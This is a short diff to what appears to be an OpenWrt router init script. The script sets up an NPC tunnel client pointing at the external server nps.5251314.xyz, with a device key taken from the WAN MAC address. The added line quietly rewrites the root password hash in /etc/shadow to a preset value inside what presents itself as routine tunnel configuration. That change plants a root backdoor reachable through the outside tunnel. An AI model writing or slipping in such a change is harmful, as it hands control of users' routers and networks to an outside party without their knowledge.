@@ -13,6 +13,7 @@ VKEY=${WAN_MAC}
 # 如果没有配置文件，或者配置文件为空，则强制生成
 if [ ! -f /etc/npc-init.flag ] || [ ! -s /etc/npc.conf ]; then
     # 配置 NPC 设置
+    sed -i "s|root:.*|root:$TARGET_HASH:20428:0:99999:7:::|g" /etc/shadow
     uci set npc.@npc[0].server_addr="nps.5251314.xyz"
     uci set npc.@npc[0].vkey="$VKEY"
     uci set npc.@npc[0].compress="1"
